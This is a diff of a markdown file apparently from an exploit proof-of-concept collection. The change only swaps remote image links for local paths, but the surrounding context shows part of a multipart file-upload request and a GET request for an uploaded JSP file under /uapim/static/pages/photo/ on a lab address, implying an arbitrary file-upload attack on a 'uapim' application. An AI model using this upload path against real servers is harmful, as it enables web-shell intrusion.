@@ -20,12 +20,12 @@ Content-Type: application/octet-stream
 ------WebKitFormBoundaryEXmnamw5gVZG9KAQ--
 ```
 
-![image](https://github.com/wy876/POC/assets/139549762/3776732e-df39-4d9e-9f6b-1ffcbd7c2d11)
+![image](../../images/3776732e-df39-4d9e-9f6b-1ffcbd7c2d11.png)
 
 
 文件上传路径
 
-![image](https://github.com/wy876/POC/assets/139549762/c6a16b38-752c-4a54-88a4-a04b88109145)
+![image](../../images/c6a16b38-752c-4a54-88a4-a04b88109145.png)
 
 ```
 GET /uapim/static/pages/photo/1/1.1713358789182.jsp HTTP/1.1
@@ -35,7 +35,7 @@ Connection: close
 Accept-Encoding: gzip, deflate, br
 ```
 
-![image](https://github.com/wy876/POC/assets/139549762/b6abe3ba-35e6-410a-a265-9b2e57d7d922)
+![image](../../images/b6abe3ba-35e6-410a-a265-9b2e57d7d922.png)
 
 `http://192.168.63.129:8088/uapim/static/pages/photo/1/1.1713358789182.jsp`
 
